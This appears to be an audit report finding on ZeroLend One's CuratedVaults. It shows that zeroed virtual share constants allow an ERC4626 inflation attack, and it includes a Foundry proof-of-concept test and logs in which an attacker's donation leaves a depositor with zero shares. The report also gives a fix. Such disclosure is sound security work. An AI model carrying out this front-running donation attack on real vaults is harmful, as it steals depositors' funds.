Calm Graphite Ram

High

# CuratedVaults are prone to inflation attacks due to not utilising virtual shares

## Summary
An attacker can frontrun a user's deposit transaction in a new vault pool position, stealing 100% of the depositors underlying token deposit by causing no shares to be minted to the user. This is caused by inflating the value of the shares to cause the user's underlying token deposit amount to round down to be worth 0 shares.

## Vulnerability Detail
[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)
```solidity
library SharesMathLib {
  using MathLib for uint256;
...SKIP...
  uint256 internal constant VIRTUAL_SHARES = 0;
...SKIP...
  uint256 internal constant VIRTUAL_ASSETS = 0;
  ```

The [morpho version](https://github.com/morpho-org/morpho-blue/blob/731e3f7ed97cf15f8fe00b86e4be5365eb3802ac/src/libraries/SharesMathLib.sol) that this code is based on has these values set to non-zero, which allows them to be protected against vault inflation attacks. However ZeroLend One has these values set to `0` meaning the vault inflation protection are not in place.

## POC
<details>
<summary>POC</summary>
Add the following code to the bottom of `IntegrationVaultTest::_setUpVault()`:

```solidity
    vm.startPrank(attacker);
    loanToken.approve(address(vault), type(uint256).max);
    collateralToken.approve(address(vault), type(uint256).max);
    vm.stopPrank();

    // ERC4626Test context address, as vm.startPrank does not change the context msg.sender in the test file
    vm.startPrank(0x50EEf481cae4250d252Ae577A09bF514f224C6C4);
    loanToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max); // market where we will be sending donation
    collateralToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max);
    vm.stopPrank();
```

Declare the attacker address in `BaseVaultTest.sol` contract under the other addresses:

```solidity
address internal attacker = makeAddr('attacker');
```

Add the following function to `ERC4626Test.sol`:
```solidity
  function testVaultInflationAttack() public {
    uint256 attackerAssets = 1e18+1;
    uint256 attackerDonation = 1e18;
    uint256 supplierAssets = 1e18;

    loanToken.mint(attacker, attackerAssets);
    loanToken.mint(supplier, supplierAssets);

    /// attacker front-run supplier
    loanToken.mint(0x50EEf481cae4250d252Ae577A09bF514f224C6C4, attackerDonation); // ERC4626Test context will perform the donation as vm.startPrank isn't changing msg.sender to attacker
    allMarkets[0].supplySimple(address(loanToken), address(vault), attackerDonation, 0); // supply vault market position
    console.log("attacker donates assets:", attackerDonation);

    vm.prank(attacker);
    uint256 attackerShares = vault.deposit(attackerAssets, attacker);
    console.log("attacker deposits underlying:", attackerAssets);
    console.log("attacker shares:", attackerShares);
    loanToken.mint(address(vault), 1e18); // same as attacker transfering, but having issue with foundry
    // attacker donation
    
    /// supplier deposit transaction
    vm.prank(supplier);
    uint256 supplierShares = vault.deposit(supplierAssets, supplier);
    console.log("supplier deposits underlying:", supplierAssets);
    console.log("supplier shares:", supplierShares);

    console.log("vault underlying:", vault.totalAssets());
    console.log("vault shares:", vault.totalSupply());
  }
```
</details>

```solidity
Logs:
  attacker donates assets: 1000000000000000000
  attacker deposits underlying: 1000000000000000001
  attacker shares: 1
  supplier deposits underlying: 1000000000000000000
  supplier shares: 0
  vault underlying: 3000000000000000001
  vault shares: 1
```

## Impact

As seen from the POC logs the depositor is minted 0 shares, and the attacker controls the singular share of the vault allowing them to redeem the share and get back their `2e18+1` attack funds and `1e18` of the supplier's funds. This is a clear loss of funds due to an inflation attack, leading to a High risk vulnerability as each vault will be vulnerable to this risk due to not utilising the Morpho vault inflation protections.

## Code Snippet

[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)

## Tool used

Foundry and Manual Review

## Recommendation

Utilise the same values as Morpho for `VIRTUAL_SHARES` and `VIRTUAL_ASSETS`:
```solidity
library SharesMathLib {
    using MathLib for uint256;

    /// @dev The number of virtual shares has been chosen low enough to prevent overflows, and high enough to ensure
    /// high precision computations.
    /// @dev Virtual shares can never be redeemed for the assets they are entitled to, but it is assumed the share price
    /// stays low enough not to inflate these assets to a significant value.
    /// @dev Warning: The assets to which virtual borrow shares are entitled behave like unrealizable bad debt.
    uint256 internal constant VIRTUAL_SHARES = 1e6;

    /// @dev A number of virtual assets of 1 enforces a conversion rate between shares and assets when a market is
    /// empty.
    uint256 internal constant VIRTUAL_ASSETS = 1;
```